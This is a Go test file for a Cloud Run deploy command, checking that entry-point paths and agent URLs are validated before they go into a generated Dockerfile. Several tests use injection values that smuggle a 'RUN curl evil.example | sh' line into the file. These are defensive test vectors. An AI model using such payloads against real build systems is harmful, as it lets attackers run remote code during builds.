// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package cloudrun

import (
	"encoding/json"
	"fmt"
	"os"
	"slices"
	"strings"
	"testing"
)

// resetFlags points the package-level flags var at a fresh, minimally valid
// state for the duration of one test, restoring the previous value afterwards.
// computeFlags reads and writes that global directly, and prepareDockerfile
// reads it too, so leaving it holding the zero value would discard the defaults
// cobra installs at flag registration (server_port 8080 among them) for every
// later test in this binary.
func resetFlags(t *testing.T, entryPointPath, a2aAgentCardURL string) {
	t.Helper()
	saved := flags
	t.Cleanup(func() { flags = saved })

	flags = deployCloudRunFlags{}
	flags.source.entryPointPath = entryPointPath
	flags.build.tempDir = t.TempDir()
	flags.cloudRun.a2aAgentCardURL = a2aAgentCardURL
}

// allowListRejection is the distinctive part of the ValidateShellArgSafe
// rejection message. The test below matches on it rather than on a label,
// because "entry point" is also a substring of the pre-existing StripExtension
// wrapper ("cannot strip '.go' extension from entry point path '%v'"): a
// payload edited to drop the .go extension would then satisfy a label-only
// assertion while saying nothing about the allow-list.
const allowListRejection = "not allowed in a value embedded in generated Dockerfile content"

func TestComputeFlags_RejectsUnsafeEntryPointBasename(t *testing.T) {
	// The basename (with .go stripped) becomes f.build.execFile, which is
	// embedded directly into the generated Dockerfile's COPY/CMD lines.
	maliciousEntryPoint := "main\"\nRUN curl evil.example | sh\n#.go"
	resetFlags(t, maliciousEntryPoint, "http://127.0.0.1:8081")

	err := flags.computeFlags()
	if err == nil {
		t.Fatal("computeFlags() = nil, want an error rejecting the unsafe entry point basename")
	}
	if !strings.Contains(err.Error(), allowListRejection) {
		t.Errorf("computeFlags() error = %v, want the allow-list rejection %q", err, allowListRejection)
	}
	// The checked value is derived from the flag rather than typed, so the
	// message has to carry the flag value for the user to locate it.
	if !strings.Contains(err.Error(), "derived from --entry_point_path") {
		t.Errorf("computeFlags() error = %v, want it to name the flag the executable name came from", err)
	}
	if !strings.Contains(err.Error(), fmt.Sprintf("%q", maliciousEntryPoint)) {
		t.Errorf("computeFlags() error = %v, want it to quote the --entry_point_path value as typed", err)
	}
}

func TestComputeFlags_RejectsUnsafeA2AAgentCardURL(t *testing.T) {
	maliciousURL := `http://127.0.0.1:8081"]` + "\nRUN curl evil.example | sh\n#"
	resetFlags(t, "main.go", maliciousURL)

	err := flags.computeFlags()
	if err == nil {
		t.Fatal("computeFlags() = nil, want an error rejecting the unsafe --a2a_agent_url value")
	}
	if !strings.Contains(err.Error(), "a2a_agent_url") {
		t.Errorf("computeFlags() error = %v, want it to mention --a2a_agent_url", err)
	}
}

func TestComputeFlags_AcceptsBenignValues(t *testing.T) {
	resetFlags(t, "main.go", "http://127.0.0.1:8081")

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error for benign values", err)
	}
	if flags.build.execFile != "main" {
		t.Errorf("execFile = %q, want %q", flags.build.execFile, "main")
	}
}

// TestComputeFlags_AcceptsNonASCIIEntryPoint guards the deliberate decision to
// let the shell-arg allowlist admit non-ASCII runes: every byte of a multi-byte
// UTF-8 rune is >= 0x80, so none of them can be a shell metacharacter or a
// Dockerfile token separator, and rejecting them would fail deploys that work
// today.
func TestComputeFlags_AcceptsNonASCIIEntryPoint(t *testing.T) {
	resetFlags(t, "agentes/café/agenté.go", "http://127.0.0.1:8081")

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error for a non-ASCII entry point path", err)
	}
	if flags.build.execFile != "agenté" {
		t.Errorf("execFile = %q, want %q", flags.build.execFile, "agenté")
	}
}

// TestComputeFlags_RejectsWhitespaceInExecFile guards the reason execFile keeps
// the allowlist here even though this Dockerfile has no RUN instruction. COPY
// splits its operands on whitespace, so an execFile containing a space emits
// "COPY my agent  /app/my agent" and fails the build. A space is exactly what
// ValidateDockerfileSafe permits, so relaxing execFile to it would reintroduce
// that. The tab case does not carry the argument, since both checks reject a
// control byte; it is here to cover the other whitespace character.
func TestComputeFlags_RejectsWhitespaceInExecFile(t *testing.T) {
	for _, entryPoint := range []string{"my agent.go", "my\tagent.go"} {
		resetFlags(t, entryPoint, "http://127.0.0.1:8081")

		if err := flags.computeFlags(); err == nil {
			t.Errorf("computeFlags() with entry point %q = nil, want an error: the COPY operands would not survive whitespace", entryPoint)
		}
	}
}

// TestComputeFlags_RejectionLeavesNoTempDir pins the ordering of the two
// checks against os.MkdirTemp. cleanTemp only runs after a fully successful
// deploy — there is no defer — so a check that fires after the temp dir is
// created leaves an empty cloudrun_<timestamp>_* directory behind on every
// rejected invocation. Only execPath needs the temp dir, so both checks belong
// above it.
func TestComputeFlags_RejectionLeavesNoTempDir(t *testing.T) {
	for name, payload := range map[string]struct{ entryPoint, agentURL string }{
		"unsafe entry point": {"main\"\nRUN curl evil.example | sh\n#.go", "http://127.0.0.1:8081"},
		"unsafe a2a url":     {"main.go", "http://127.0.0.1:8081\"]\nRUN curl evil.example | sh\n#"},
	} {
		t.Run(name, func(t *testing.T) {
			resetFlags(t, payload.entryPoint, payload.agentURL)
			parent := flags.build.tempDir

			if err := flags.computeFlags(); err == nil {
				t.Fatal("computeFlags() = nil, want an error")
			}
			entries, err := os.ReadDir(parent)
			if err != nil {
				t.Fatalf("cannot read the temp dir parent: %v", err)
			}
			for _, e := range entries {
				t.Errorf("rejected invocation left %q behind in the temp dir parent", e.Name())
			}
		})
	}
}

// TestPrepareDockerfile_A2AURLReachesCMDArray runs the branch that interpolates
// --a2a_agent_url, which only fires when --a2a is set, and checks the emitted
// CMD is still a parseable JSON array carrying the value. Without this the
// validator and the line it protects are only connected by reading the code.
func TestPrepareDockerfile_A2AURLReachesCMDArray(t *testing.T) {
	const agentURL = "http://127.0.0.1:8081"
	resetFlags(t, "main.go", agentURL)
	flags.cloudRun.a2a = true
	flags.cloudRun.serverPort = 8080

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error", err)
	}
	if err := flags.prepareDockerfile(); err != nil {
		t.Fatalf("prepareDockerfile() = %v, want no error", err)
	}

	content, err := os.ReadFile(flags.build.dockerfileBuildPath)
	if err != nil {
		t.Fatalf("cannot read the generated Dockerfile: %v", err)
	}
	var cmdLine string
	for _, line := range strings.Split(string(content), "\n") {
		if rest, ok := strings.CutPrefix(line, "CMD "); ok {
			cmdLine = rest
		}
	}
	if cmdLine == "" {
		t.Fatalf("no CMD instruction in the generated Dockerfile:\n%s", content)
	}

	var args []string
	if err := json.Unmarshal([]byte(cmdLine), &args); err != nil {
		t.Fatalf("CMD %s does not parse as a JSON array: %v", cmdLine, err)
	}
	if !slices.Contains(args, agentURL) {
		t.Errorf("CMD args = %q, want them to carry %q", args, agentURL)
	}
}
